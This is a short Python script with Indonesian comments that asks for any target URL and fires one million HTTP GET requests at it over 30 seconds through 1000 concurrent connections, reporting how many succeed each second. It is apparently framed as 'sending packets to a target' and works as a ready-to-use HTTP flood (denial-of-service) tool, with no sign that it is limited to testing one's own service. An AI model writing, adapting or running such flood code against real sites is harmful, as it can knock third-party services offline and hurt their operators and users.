import aiohttp
import asyncio
import time

# Konfigurasi default
TOTAL_REQUESTS = 1_000_000
DURATION = 30
REQUESTS_PER_SECOND = TOTAL_REQUESTS // DURATION
CONCURRENT_CONNECTIONS = 1000  # Ubah sesuai kemampuan koneksi dan CPU

sem = asyncio.Semaphore(CONCURRENT_CONNECTIONS)

# Ambil input URL dari pengguna
URL = input("Masukkan URL target (termasuk https://): ")

async def send_request(session):
    async with sem:
        try:
            async with session.get(URL, timeout=5) as response:
                await response.text()
                return response.status
        except Exception as e:
            return str(e)

async def send_batch(session, batch_size):
    tasks = [send_request(session) for _ in range(batch_size)]
    results = await asyncio.gather(*tasks)
    return results

async def run():
    print(f"Mulai mengirimkan paket ke {URL} selama {DURATION} detik...")
    async with aiohttp.ClientSession() as session:
        for second in range(DURATION):
            start_time = time.time()
            results = await send_batch(session, REQUESTS_PER_SECOND)
            success_count = sum(1 for r in results if isinstance(r, int) and r == 200)
            print(f"Detik ke-{second+1}: {len(results)} request dikirim, {success_count} berhasil (HTTP 200)")
            elapsed = time.time() - start_time
            if elapsed < 1:
                await asyncio.sleep(1 - elapsed)

if __name__ == "__main__":
    asyncio.run(run())